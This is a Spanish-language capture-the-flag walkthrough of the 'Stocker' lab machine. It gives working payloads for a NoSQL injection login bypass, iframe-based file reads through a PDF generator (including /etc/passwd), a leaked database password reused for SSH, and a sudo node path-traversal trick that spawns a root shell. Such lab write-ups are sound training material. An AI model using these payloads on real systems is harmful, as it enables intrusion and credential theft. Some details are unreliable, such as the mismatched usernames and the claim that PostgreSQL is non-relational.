-----------
- Tags: #linux #nosql #htmlinjection #nodejs #pathtraversal #express
-----------

## Enumeración
----------

- Identificación de SO:
```bash
ping -c 1 10.10.11.196
```
![Pasted image 20240831133115.png](Imagenes/Stocker/Pasted image 20240831133115.png)
Como vemos según lo que nos indica el `ttl` es una maquina `Linux`

- Identificación de puertos abiertos en la maquina:
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.196 -oG allPorts
```

- Identificación de servicios corriendo en los puertos abiertos:
```bash
nmap -p22,80 -sCV 10.10.11.196 -oN targeted
```

![Pasted image 20240831133708.png](Imagenes/Stocker)

- Al ver que hay un puerto 80 con el servicio `http` corriendo por debajo podemos lanzar el siguiente script de nmap:
```bash
nmap -p80 --script="http-enum" 10.10.11.196 -oN webScan
```

- Para ver información básica sobre la web que hay corriendo por el servidor:
```bash
whatweb http://stocker.htb/
```

![[Pasted image 20240831134053.png]]

-----------------
## Fuzzing
------------

- Miramos si hay subdominios:
```bash
wfuzz -c -t 200 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.stocker.htb" http://stocker.htb/
```

![[Pasted image 20240831134343.png]]

Como hemos visto hemos encontrado un subdominio en el que vamos a mirar que es lo que hay dentro de el y haremos un poco de enumeración.

![[Pasted image 20240831134725.png]]

-------
## Explotación
--------------------

Como podemos observar el nuevo `subdominio` es un panel de login, podemos probar varios tipos de técnicas para poder bypassearlo o identificación de vulnerabilidades como lo siguiente:
- Probar passwords por defecto
- SqlIjection
- NoSQLInjection

**De primeras lo que tenemos que hacer al ver `Express` & `NodeJs` es interceptar la petición con `burpsuite` y ver si podemos mandar peticiones en `JSON`**

`Cuando una aplicacion esta construida con NodeJs y Express normalmente estan construidas sobre bases de datos diferentes a MySql, como por ejemplo PostgreSQL y MongoDB, estas dos son bases de datos no relacionales, por lo que podemos hacer Inyecciones SQL para bypassear el panel de Login`

- Antes tenemos que cambiar el `Conten-Type:` `application/json`
- Payload:
```bash
{"username": {"$ne": null}, "password": {"$ne": null} }
```

Una vez que hemos bypasseado el panel de Login empezamos a indagar un poco en la pagina web para encontrar vulnerabilidades que podemos encontrar.

---------------
## HTML INJECTION
-------------------

**A la hora de crear un pedido nos crea un archivo pdf, si nosotros lo capturamos con Burpsuite a la hora de la creación del archivo pdf podemos comprobar que podemos modificar los elementos que hay dentro del pdf, dentro de todos estos elementos el que nos importa a nosotros es el `titulo`, el que se muestra por pantalla básicamente.**

**Por lo general los generadores de PDF pueden renderizar etiquetas html, lo que nos abre una posibilidad de hacer una inyeccion html.**
**Hemos intentado inyectar unas etiquetas `<script>` dentro del pdf, al darle a recargar el servidor devuelve un error interno, lo que significa que intento representar las etiquetas pero fallo.**

**Teniendo en cuenta la información anterior, es posible que podamos cargar el generador de PDF y mostrar archivos del sistema mediante `iframes`. Considere la siguiente carga útil HTML.**

- Payload:
```bash
<iframe src='file:///etc/passwd' width='1000' height='1000'></iframe>
```

`iframes, o Inline Frames, son elementos HTML que pueden cargar otra página HTML dentro de la misma documento. El atributo src es el origen del contenido del servidor externo o interno.`

- Ejemplo practico en `Burpsuite`:
![[Pasted image 20240831141423.png]]

Al recargar veremos el documento pdf generado...

![[Pasted image 20240831141651.png]]
Como vemos tenemos un LFI en el que podemos listar archivos internos del servidor, lo próximo que tendríamos que hacer es buscar algún archivo que nos proporcione credenciales como algún `id_rsa` o algún archivo de configuración del servidor.

---------------
## Wildcard Injection
-------------

**Sin embargo, nos encontramos con un problema, que es que no sabemos dónde está la aplicación de desarrollo situado. Un truco fácil que podemos usar para determinar potencialmente esta ubicación es enviar JSON con formato incorrecto en uno de los puntos de conexión de la aplicación para ver si produce un error. Usemos el punto de conexión de compra como lo hicimos previamente. Para hacer esto podemos atrapar otra solicitud en Burp y quitar uno de los corchetes }. Después Al quitar el corchete y enviar la solicitud, obtenemos el siguiente mensaje de error.**

![[Pasted image 20240831142307.png]]

**A partir del error, podemos ver que la aplicación está alojada en la carpeta `/var/www/dev/` y dado que se trata de un `NodeJS` podemos intentar leer varios nombres de archivo predeterminados para encontrar la función principal de la aplicación aplicación. Por lo general, esto se denomina `index.js` o `main.js` o incluso `server.js`.**

- Hacemos lo mismo con `Burpsuite` aplicando otro payload:
```bash
<iframe src='file:///var/www/dev/index.js' width='1000' height='1000'></iframe>
```

- Nos devuelve el siguiente archivo de configuracion del servidor:
```bash
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?
authSource=admin&w=1";
```

**Como hemos visto anteriormente el usuario era `angoose` y la password como vemos es `IHeardPassphrasesArePrettySecure`**

------------
## Conexión SSH
------------

```bash
ssh agoose@10.10.11.196
```

----------
## Escalada de Privilegios
-------------

```bash
sudo -l
```

![[Pasted image 20240831142949.png]]

**Lo que nos esta diciendo es que el usuario angoose puede ejecutar node como `sudo` ejecutando un script de la ruta `/usr/local/scripts/*.js`**

Por lo que podemos hacer lo siguiente, con el siguiente `payload` podemos ejecutar node e iniciar una shell como `root`:
```bash
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

Como solo podemos ejecutar scripts de la ruta `/usr/local/scripts` podemos probar a en el directorio `/tmp` crear el siguiente script y ejecutar el siguiente comando:
- shell.js
```bash
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```
- Comando:
```bash
sudo node /usr/local/scripts/credentials.js/../../../../../../tmp/shell.js
```

**Lo que estamos realizando es un `path traversal` y estamos bypasseando que solo se puedan ejecutar scripts de dicha ruta.**
